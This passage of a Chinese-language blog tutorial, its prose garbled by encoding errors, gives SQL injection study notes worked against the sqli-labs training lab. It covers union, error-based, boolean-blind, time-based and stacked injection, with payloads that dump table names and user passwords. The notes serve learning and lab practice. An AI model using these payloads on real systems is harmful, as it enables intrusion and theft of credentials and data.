¼)</code></p></li></ul><ul><li>GETè¯·æ±‚æ—¶<code>#</code>æ— æ³•æ­£å¸¸ä½¿ç”¨ï¼Œç”¨ <code>--+</code>æˆ–è€…<code>%23</code>(#çš„urlç¼–ç )<br>åŸå› ï¼šurlä¸­æ— æ³•æ˜¾ç¤ºæŸäº›ç‰¹æ®Šç¬¦å·ã€‚åœ¨urlä¸­#è¡¨ç¤ºä¹¦ç­¾ï¼Œå¯¹æœåŠ¡ç«¯æ— ç”¨ï¼Œå¯¼è‡´HTTPè¯·æ±‚ä¸­ä¸åŒ…å«# ã€‚<br>(åœ¨urlä¸­è¾“å…¥#æŒ‰å›è½¦å°±èƒ½å‘ç°#æ²¡æœ‰è½¬æ¢ä¸ºurlencodeç¼–ç æ ¼å¼)</li><li>urlç¼–ç ï¼š% + å¯¹åº”ASCIIç </li></ul><h2 id="å†…è”æ³¨é‡Š"><a href="#å†…è”æ³¨é‡Š" class="headerlink" title="å†…è”æ³¨é‡Š"></a>å†…è”æ³¨é‡Š</h2><p>å½¢å¦‚ï¼š <code>/*ï¼code   */</code><br>å†…è”æ³¨é‡Šå¯ç”¨äºæ•´ä¸ªsqlè¯­å¥ä¸­ï¼Œæ‰§è¡Œsqlæ³¨å…¥<br>å†…è”æ³¨é‡Šä¼šå°† <code>/*ï¼code   */</code>ä¸­çš„codeæ³¨é‡Šæ‰ï¼Œä½†ä»æ‰§è¡Œcodeä»£è¡¨çš„å‘½ä»¤</p><blockquote><p>index.php?id=1 /<em>! UNION</em>/ /<em>! SELECT</em>/ 1,2,3</p></blockquote><p><em>å†…è”æ³¨é‡Šå¯ä»¥ç”¨æ¥è¿›è¡Œç»•è¿‡æ³¨å…¥</em></p><h1 id="æ³¨å…¥æ€è·¯"><a href="#æ³¨å…¥æ€è·¯" class="headerlink" title="æ³¨å…¥æ€è·¯"></a>æ³¨å…¥æ€è·¯</h1><blockquote><p>1.æ³¨å…¥ç‚¹<br>2.åˆ¤æ–­å­—æ®µæ•°<br>3.çˆ†å›æ˜¾ä½<br>4.çˆ†æ®µ<br>5.çˆ†åº“<br>6.çˆ†è¡¨<br>7.çˆ†åˆ—<br>8.çˆ†å€¼</p></blockquote><p>å¶å°”çˆ†å‡ºçš„ä¿¡æ¯æ˜¯ç»è¿‡åŠ å¯†çš„ï¼Œå¯ä»¥åˆ°è§£å¯†ç½‘ç«™è§£å¯†ï¼š<br>å¦‚ï¼š<br><a href="https://www.cmd5.org">md5 decrypt</a><br><a href="https://pmd5.com/">pmd5</a><br><a href="http://tools.bugscaner.com/encodeanddecode/">å„ç§åŠ è§£å¯†</a></p><h2 id="åˆ¤æ–­æ³¨å…¥ç‚¹åŠå…¶é—­åˆæ–¹å¼"><a href="#åˆ¤æ–­æ³¨å…¥ç‚¹åŠå…¶é—­åˆæ–¹å¼" class="headerlink" title="åˆ¤æ–­æ³¨å…¥ç‚¹åŠå…¶é—­åˆæ–¹å¼"></a>åˆ¤æ–­æ³¨å…¥ç‚¹åŠå…¶é—­åˆæ–¹å¼</h2><p>æ‰¾ä¼ å‚ç‚¹ï¼Œå†åˆ¤æ–­æ˜¯å¦æœ‰sqlæ³¨å…¥æ¼æ´</p><h3 id="æ³¨å…¥ç‚¹"><a href="#æ³¨å…¥ç‚¹" class="headerlink" title="æ³¨å…¥ç‚¹"></a>æ³¨å…¥ç‚¹</h3><p>æ³¨å…¥ç‚¹å¤§è‡´å¯åˆ†ä¸ºæ•°å­—å‹å’Œå­—ç¬¦å‹<br>åç«¯æŸ¥æ‰¾ä»£ç :</p><ul><li>æ•°å­—å‹ï¼š <code>SELECT åˆ— FROM è¡¨ WHERE  id=1</code> ï¼ˆæ•°å­—å‹åˆ—=å€¼ï¼‰</li><li>å­—ç¬¦å‹ï¼š <code>SELECT åˆ— FROM è¡¨ WHERE  id=&#39;1&#39;</code>ï¼ˆå­—ç¬¦å‹åˆ—=â€™å€¼â€™ï¼‰</li><li>è¿˜æœ‰ä¸€ç§æœç´¢å‹æ³¨å…¥æˆ‘ç†è§£ä¸æ·±ï¼Œå¯ä»¥çœ‹ä¸€ä¸‹è¿™ç¯‡ï¼š<a href="https://blog.csdn.net/weixin_42277564/article/details/94401484">SQLæ³¨å…¥-æœç´¢å‹è¾“å…¥</a></li></ul><h3 id="é—­åˆæ–¹å¼"><a href="#é—­åˆæ–¹å¼" class="headerlink" title="é—­åˆæ–¹å¼"></a>é—­åˆæ–¹å¼</h3><ul><li>æ•°å­—å‹ä¸å­˜åœ¨é—­åˆæ–¹å¼ï¼Œåç«¯ä»£ç ä¸å¯¹å…¶å‚æ•°å¤„ç†ï¼Œè€Œæ˜¯ç›´æ¥èµ‹å€¼ç»™å˜é‡ã€‚</li></ul><blockquote><p>eg: â€”(sqli-labs)â€“Less2<br>?id=1    æ­£å¸¸å›æ˜¾<br>?id=-1    å˜åŒ–(æ„é€ ä¸å¯èƒ½çš„å€¼å¦‚ -1ã€999999999)<br>?id=1 and 1=1    æ­£å¸¸å›æ˜¾<br>?id=1 and 1=2    å˜åŒ–ï¼ˆæ­¤æ—¶åŸºæœ¬è¯¾åˆ¤æ–­å­˜åœ¨æ•°å­—å‹æ³¨å…¥ç‚¹ï¼‰<br>?id=1 or 1=1 æ­£å¸¸å›æ˜¾</p></blockquote><ul><li>å­—ç¬¦å‹çš„é—­åˆæ–¹å¼å¾ˆå¤š<br>ä¾‹å¦‚ <code>â€˜ â€™</code>ã€ <code>â€œ â€</code>ã€<code>( )</code>ï¼Œè¿˜æœ‰å®ƒä»¬çš„å˜ç§ç»„åˆ <code>(&#39; &#39;)</code>ã€ <code>(&quot; &quot;)</code> ç­‰ç­‰</li></ul><blockquote><p>eg:                              â€”(sqli-labs)â€“Less1<br>?id=1,æ­£å¸¸å›æ˜¾<br>?id=1 and 1=1 æ­£å¸¸å›æ˜¾<br>?id=1 and 1=2 æ­£å¸¸å›æ˜¾<br>â€”â€”â€”â€”â€”â€”-åˆ¤æ–­ä¸ºéæ•°å­—å‹æ³¨å…¥<br>?id=1â€™        å˜åŒ–/æŠ¥é”™<br>?id=1â€™ â€“+        æ­£å¸¸å›æ˜¾<br>â€”â€”â€”â€”â€”â€”-åˆ¤æ–­ä¸ºå­—ç¬¦å‹æ³¨å…¥ã€‚é—­åˆæ–¹å¼ä¸ºå•å¼•å·â€™ â€™<br>â€”â€”â€”â€”â€”â€”â€”â€”â€”å¯¹ä¸åŒé—­åˆç±»å‹å°† â€˜ æ”¹ä¸ºå¯¹åº”é—­åˆç¬¦å·å³å¯</p></blockquote><h2 id="åˆ¤æ–­å­—æ®µæ•°åŠå›æ˜¾ä½"><a href="#åˆ¤æ–­å­—æ®µæ•°åŠå›æ˜¾ä½" class="headerlink" title="åˆ¤æ–­å­—æ®µæ•°åŠå›æ˜¾ä½"></a>åˆ¤æ–­å­—æ®µæ•°åŠå›æ˜¾ä½</h2><h3 id="åˆ¤æ–­å­—æ®µæ•°"><a href="#åˆ¤æ–­å­—æ®µæ•°" class="headerlink" title="åˆ¤æ–­å­—æ®µæ•°"></a>åˆ¤æ–­å­—æ®µæ•°</h3><blockquote><p>eg:<br>?id=1â€™ order by 1 â€“+<br>?id=1â€™ order by 2 â€“+<br>?id=1â€™ order by 3 â€“+<br><img src="https://i.loli.net/2021/02/13/PYcbg56GCvoNQ2H.png"><br>?id=1â€™ order by 4 â€“+<br><img src="https://i.loli.net/2021/02/13/sV8G3k9mhRiIEaX.png"></p></blockquote><p>è¯´æ˜å­—æ®µæ•°ä¸º3ï¼Œ</p><h3 id="åˆ¤æ–­å›æ˜¾ä½"><a href="#åˆ¤æ–­å›æ˜¾ä½" class="headerlink" title="åˆ¤æ–­å›æ˜¾ä½"></a>åˆ¤æ–­å›æ˜¾ä½</h3><blockquote><p>eg:<br>?id=-1â€™ union select 1,2,3 â€“+<br><img src="https://i.loli.net/2021/02/13/V9R1TWPtJSKjeNx.png"></p></blockquote><p>2,3ä¸ºå›æ˜¾ä½ï¼Œå› æ­¤åœ¨2ã€3çš„ä½ç½®æ’å…¥è¯­å¥å³å¯ã€‚</p><blockquote><p>eg:<br>?id=-1â€™ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() â€“+</p></blockquote><h2 id="ä¸€åº“ä¸‰è¡¨å››å­—æ®µ"><a href="#ä¸€åº“ä¸‰è¡¨å››å­—æ®µ" class="headerlink" title="ä¸€åº“ä¸‰è¡¨å››å­—æ®µ"></a>ä¸€åº“ä¸‰è¡¨å››å­—æ®µ</h2><p>å¾ˆå¤šæ•™ç¨‹è®²çš„å¾ˆè¯¦ç»†ï¼Œè¿™é‡Œä¸åšèµ˜è¿°ï¼ŒæŒ‚ä¸ªå½“æ—¶è®°çš„ç»“æ„å›¾<br><img src="https://i.loli.net/2021/02/13/VMmBU5JvkuAH9Oe.jpg"><br>select schema_name from information_schema.schemata<br>select table_name from information_schema.tables where table_schema=â€™xxxâ€™<br>select column_name from information_schema.columns where table_name=â€™xxxâ€™<br>select group_concat(xxx) from xxx</p><h2 id="å„ç§æ³¨å…¥"><a href="#å„ç§æ³¨å…¥" class="headerlink" title="å„ç§æ³¨å…¥"></a>å„ç§æ³¨å…¥</h2><h3 id="unionè”åˆæŸ¥è¯¢"><a href="#unionè”åˆæŸ¥è¯¢" class="headerlink" title="unionè”åˆæŸ¥è¯¢"></a>unionè”åˆæŸ¥è¯¢</h3><ul><li><p>é€‚ç”¨ï¼š<code>é¡µé¢æœ‰å›æ˜¾ä½çš„æƒ…å†µ</code></p></li><li><p>å½“è®¿é—®id=1 union selecet 1,2,3æ—¶ï¼Œæ‰§è¡Œçš„sqlè¯­å¥ä¸ºï¼š <code>sql select * from users where &#39;id&#39;=1 union select 1,2,3 </code></p><p>æ­¤æ—¶çš„sqlè¯­å¥å¯åˆ†ä¸ºä¸¤æ¡ï¼š</p><ol><li><p><code>select * from users where &#39;id&#39;=1</code></p></li><li><p><code>union select 1,2,3</code> </p><p> æ­¤æ—¶åˆ©ç”¨ç¬¬äºŒæ¡è¯­å¥(UnionæŸ¥è¯¢)å³å¯è·å–æ•°æ®åº“ä¸­çš„æ•°æ®</p></li></ol></li></ul><p>eg:sqli-labsâ€”â€”Less1  </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-comment">--åˆ¤æ–­æ³¨å…¥ç‚¹ç±»å‹ </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>#æ­£å¸¸å›æ˜¾ <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> #æ­£å¸¸å›æ˜¾ <br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> #æ­£å¸¸å›æ˜¾<br><span class="hljs-comment">-------------------éæ•°å­—å‹æ³¨å…¥ </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>â€™,æŠ¥é”™ ?id<span class="hljs-operator">=</span><span class="hljs-number">1</span>â€™ <span class="hljs-comment">--+#æ­£å¸¸å›æ˜¾</span><br><span class="hljs-comment">-------------------å­—ç¬¦å‹æ³¨å…¥ã€‚é—­åˆæ–¹å¼ä¸ºå•å¼•å·â€™ â€™</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">2</span><span class="hljs-comment">--çˆ†æ®µ  </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 order by 1 --+ #æ­£å¸¸ </span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">2</span> <span class="hljs-comment">--+ #æ­£å¸¸ </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; or 1=1 order by 3 --+ #ç©ºç™½ </span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> <span class="hljs-number">4</span> <span class="hljs-comment">--+ #æŠ¥é”™(Unknow column â€˜4â€™ in â€˜order clauseâ€™)</span><br><br>æˆ– <br><br>ä» ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1--+#æŠ¥é”™ </span><br><span class="hljs-string">åˆ° ?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> <span class="hljs-comment">--+  #æ­£å¸¸å›æ˜¾å³å¯</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">3</span><span class="hljs-comment">--çˆ†æ•°æ®åº“ </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,database()--+ å¾—åˆ°æ•°æ®åº“åsecurity</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">4</span><span class="hljs-comment">--çˆ†è¡¨ </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+ </span><br><span class="hljs-string">#å¾—åˆ°è¡¨åï¼šemails,referers,uagents,users</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">5</span><span class="hljs-comment">--çˆ†åˆ—å </span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; --+ </span><br><span class="hljs-string">å¾—åˆ°åˆ—å avatar,failed_login,....,USER,id,password,username</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">6</span><span class="hljs-operator">-</span>çˆ†å€¼ ?id<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(username,0x2b,password) from users --+ </span><br><span class="hljs-string">å¾—åˆ°ï¼šï¼ˆ+åˆ†éš”è´¦å·å¯†ç ï¼‰ Dumb+Dumb,I-kill-you+Angelina,.....</span><br></code></pre></td></tr></table></figure><h3 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h3><ul><li><p>é€‚ç”¨ï¼š<code>é¡µé¢ä¸­ä¼šæ˜¾ç¤ºSQLçš„æŠ¥é”™ä¿¡æ¯ </code><br>ä½†ä¸€èˆ¬æƒ…å†µä¸‹SQLçš„æŠ¥é”™ä¿¡æ¯æ˜¯ä¸ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸­çš„ï¼Œå¿…é¡»åœ¨åœ¨php.ini è¿›è¡Œé…ç½®<code>display_errors=On</code>   <em>â€“(å¼€å¯PHPé”™è¯¯å›æ˜¾)</em>  </p></li><li><p>SQLæŠ¥é”™ä¿¡æ¯è¢«æ˜¾ç¤ºåœ¨é¡µé¢ä¸Š<br>(å³é€šè¿‡ <code>echo mysqli_error($con)</code> å°†é”™è¯¯ä¿¡æ¯è¾“å‡ºåˆ°é¡µé¢)</p></li></ul><h4 id="floorå‡½æ•°"><a href="#floorå‡½æ•°" class="headerlink" title="floorå‡½æ•°"></a>floorå‡½æ•°</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and (select count(*) from information_schema.tables group by concat((æŸ¥è¯¢è¯­å¥),floor(rand(0)*2))) --+</span><br></code></pre></td></tr></table></figure><h4 id="updataxmlå‡½æ•°"><a href="#updataxmlå‡½æ•°" class="headerlink" title="updataxmlå‡½æ•°"></a>updataxmlå‡½æ•°</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and (select updatexml(1,concat(0x7e,(æŸ¥è¯¢è¯­å¥),0x7e),1))--+</span><br></code></pre></td></tr></table></figure><h4 id="extractvalueå‡½æ•°"><a href="#extractvalueå‡½æ•°" class="headerlink" title="extractvalueå‡½æ•°"></a>extractvalueå‡½æ•°</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27; and (select extractvalue(1,concat(0x7e,(æŸ¥è¯¢è¯­å¥),0x7e)))--+</span><br></code></pre></td></tr></table></figure><h3 id="boolç›²æ³¨"><a href="#boolç›²æ³¨" class="headerlink" title="boolç›²æ³¨"></a>boolç›²æ³¨</h3><ul><li>é€‚ç”¨æ¡ä»¶ï¼š<br><code>æ— æŸ¥è¯¢ç»“æœã€æŠ¥é”™ä¿¡æ¯çš„å›æ˜¾ï¼Œä½†é¡µé¢ä¼šæ ¹æ®æŸ¥è¯¢ç»“æœçš„æ­£ç¡®ä¸å¦å˜åŒ–çš„æƒ…å†µ</code></li><li>çœŸå®æ¸—é€ä¸­æ‰‹åŠ¨ç›²æ³¨ä¸sqlmapæ¯”èµ·æ¥æ•ˆç‡å¤ªä½ï¼Œå®æˆ˜ä¸­è¿˜æ˜¯ä½¿ç”¨sqlmapï¼Œä½†ä¸€å®šè¦ç†ŸçŸ¥åŸç†</li></ul><p>-å¸¸ç”¨å‡½æ•°ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs sql">æˆªå–<br>substr()ã€<span class="hljs-built_in">substring</span>()ã€id():<br><span class="hljs-built_in">substring</span>()å’Œmid()çš„ç”¨æ³•å’Œsubstr()ä¸€æ ·ï¼Œä½†æ˜¯mid()æ˜¯ä¸ºäº†å‘ä¸‹å…¼å®¹VB6<span class="hljs-number">.0</span>ï¼Œå·²ç»è¿‡æ—¶ï¼Œä»¥ä¸Šçš„å‡ ä¸ªå‡½æ•°çš„poséƒ½æ˜¯ä»<span class="hljs-number">1</span>å¼€å§‹çš„<br>eg:<br>substr(string, pos, len): ä»poså¼€å§‹ï¼Œå–é•¿åº¦ä¸ºlençš„å­ä¸²<br>substr(string, pos): ä»poså¼€å§‹ï¼Œå–åˆ°stringçš„æœ€å<br><br><span class="hljs-keyword">left</span>()å’Œ<span class="hljs-keyword">right</span>():<br><span class="hljs-keyword">left</span>(string, len)å’Œ<span class="hljs-keyword">right</span>(string, len): åˆ†åˆ«æ˜¯ä»å·¦æˆ–ä»å³å–stringä¸­é•¿åº¦ä¸ºlençš„å­ä¸²<br>limit<br>limit pos len: åœ¨è¿”å›é¡¹ä¸­ä»poså¼€å§‹å»lenä¸ªè¿”å›å€¼ï¼Œposçš„ä»<span class="hljs-number">0</span>å¼€å§‹<br><br>ascii()å’Œ<span class="hljs-type">char</span>()å’Œord():<br>ascii(<span class="hljs-type">char</span>): æŠŠ<span class="hljs-type">char</span>è¿™ä¸ªå­—ç¬¦è½¬ä¸ºasciiç <br><span class="hljs-type">char</span>(ascii_int): å’Œascii()çš„ä½œç”¨ç›¸åï¼Œå°†asciiç è½¬å­—ç¬¦<br>ord(str): å¦‚æœå­—ç¬¦ä¸²strå¥é¦–æ˜¯å•å­—èŠ‚è¿”å›ä¸ascii()å‡½æ•°è¿”å›çš„ç›¸åŒå€¼ã€‚<br></code></pre></td></tr></table></figure><p> eg:sqli-labs Less5</p><ul><li>ï¼ˆæ­£ç¡®åˆ™å›æ˜¾ï¼Œä¸æ­£ç¡®åˆ™æ— å›æ˜¾ï¼‰</li><li>ï¼ˆå¯ä½¿ç”¨å¦‚left((select database()),1)&lt;â€™tâ€™  è¿™æ ·çš„æ¯”è¾ƒäºŒåˆ†æŸ¥æ‰¾æ–¹æ³•å¿«é€Ÿçˆ†ç ´ï¼‰</li></ul><p>â€“çˆ†åº“ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left((select database()),1)=&#x27;</span>s<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">8</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>â€“çˆ†è¡¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left((select table_name from information_schema.tables where table_schema=database() limit 3,1),5)=&#x27;</span>users<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>â€“çˆ†åˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 4,1),8)=&#x27;</span>password<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left((select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 12,1),8)=&#x27;</span>username<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><p>â€“çˆ†å­—æ®µ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length((select password from users order by id limit 0,1))=8 --+(é•¿åº¦)</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>((<span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">4</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;dumb&#x27;</span> <span class="hljs-comment">--+</span><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left((select username from users order by id limit 0,1),4)=&#x27;</span>dumb<span class="hljs-string">&#x27; --+</span><br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length((select password from users order by id limit 1,1))=10 --+(é•¿åº¦)</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>((<span class="hljs-keyword">select</span> username <span class="hljs-keyword">from</span> users <span class="hljs-keyword">order</span> <span class="hljs-keyword">by</span> id limit <span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">8</span>)<span class="hljs-operator">=</span><span class="hljs-string">&#x27;angelina  &#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="æ—¶é—´ç›²æ³¨"><a href="#æ—¶é—´ç›²æ³¨" class="headerlink" title="æ—¶é—´ç›²æ³¨"></a>æ—¶é—´ç›²æ³¨</h3><ul><li>é€‚ç”¨ï¼š<br><code>æ— æŸ¥è¯¢ç»“æœã€æŠ¥é”™ä¿¡æ¯çš„å›æ˜¾ï¼Œé¡µé¢æ­£å¸¸æ˜¾ç¤ºçš„æƒ…å†µ</code></li><li>æ—¶é—´ç›²æ³¨å³åˆ©ç”¨<code>sleep()</code>æˆ–<code>benchmark()</code>ç­‰å‡½æ•°ä½¿å¾—å‘½ä»¤æ‰§è¡Œæ—¶é—´å˜é•¿ï¼Œå¸¸ä¸<code>if(expr1,expr2,expr3)</code>æ­é…ä½¿ç”¨çŒœè§£æ•°æ®åº“</li><li><code>if(expr1,expr2,expr3)</code>å«ä¹‰ï¼š<code>exp1</code>ä¸º<strong>TRUE</strong> åˆ™ if()è¿”å›å€¼ä¸º<code>expr2</code>,å¦åˆ™è¿”å›å€¼ä¸º<code>expr3</code>. â€”â€”å³ (1çœŸè¿”å›2ï¼Œ1å‡è¿”å›3).</li><li>egåˆ¤æ–­æ•°æ®åº“åº“åé•¿åº¦è¯­å¥ä¸ºï¼š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">if (length ( database() ) <span class="hljs-operator">&gt;</span><span class="hljs-number">1</span> , sleep(<span class="hljs-number">5</span>) , <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><h3 id="å †å æ³¨å…¥"><a href="#å †å æ³¨å…¥" class="headerlink" title="å †å æ³¨å…¥"></a>å †å æ³¨å…¥</h3><ul><li>å †å æ³¨å…¥çš„ä½¿ç”¨æ¡ä»¶ååˆ†æœ‰é™ï¼Œå¯èƒ½å—åˆ°APIã€æ•°æ®åº“å¼•æ“æˆ–è€…æƒé™çš„é™åˆ¶ã€‚</li><li>åœ¨å †å æ³¨å…¥é¡µé¢ä¸­ï¼Œç¨‹åºä¼šè·å–GETå‚æ•°IDï¼Œå¹¶åˆ©ç”¨PDOçš„æ–¹å¼æŸ¥è¯¢æ•°æ®ï¼ŒIDä¼šè¢«æ‹¼æ¥åˆ°æŸ¥è¯¢è¯­å¥å½“ä¸­ï¼Œå¯¼è‡´PDOæ²¡èµ·åˆ°é¢„ç¼–è¯‘çš„æ•ˆæœâ€”-å¯¼è‡´ç¨‹åºå­˜åœ¨sqlæ³¨å…¥æ¼æ´</li><li><em>åªæœ‰å½“è°ƒç”¨æ•°æ®åº“å‡½æ•°æ”¯æŒæ‰§è¡Œå¤šæ¡sqlè¯­å¥æ—¶æ‰èƒ½å¤Ÿä½¿ç”¨ï¼Œåˆ©ç”¨mysqli_multi_query()å‡½æ•°å°±æ”¯æŒå¤šæ¡sqlè¯­å¥åŒæ—¶æ‰§è¡Œï¼Œä½†å®é™…æƒ…å†µä¸­ï¼Œå¦‚PHPä¸ºäº†é˜²æ­¢sqlæ³¨å…¥æœºåˆ¶ï¼Œå¾€å¾€ä½¿ç”¨è°ƒç”¨æ•°æ®åº“çš„å‡½æ•°æ˜¯mysqli_ query()å‡½æ•°ï¼Œå…¶åªèƒ½æ‰§è¡Œä¸€æ¡è¯­å¥ï¼Œåˆ†å·åé¢çš„å†…å®¹å°†ä¸ä¼šè¢«æ‰§è¡Œ</em></li><li>å †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œå¤šæ¡è¯­å¥ï¼Œå¤šè¯­å¥ä¹‹é—´ä»¥åˆ†å·éš”å¼€ã€‚å †å æ³¨å…¥å°±æ˜¯åˆ©ç”¨æ­¤ç‰¹ç‚¹ï¼Œåœ¨ç¬¬äºŒæ¡sqlè¯­å¥ä¸­æ„é€ è¦æ³¨å…¥çš„è¯­å¥ã€‚</li><li>egï¼š</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;;select if(substr(user(),1,1)=&#x27;</span>r<span class="hljs-string">&#x27;,sleep(3),1) --+</span><br></code></pre></td></tr></table></figure><ul><li>è¿™é‡Œçš„ç¬¬äºŒæ¡è¯­å¥(select if(substr(user(),1,1)=â€™râ€™,sleep(3),1) 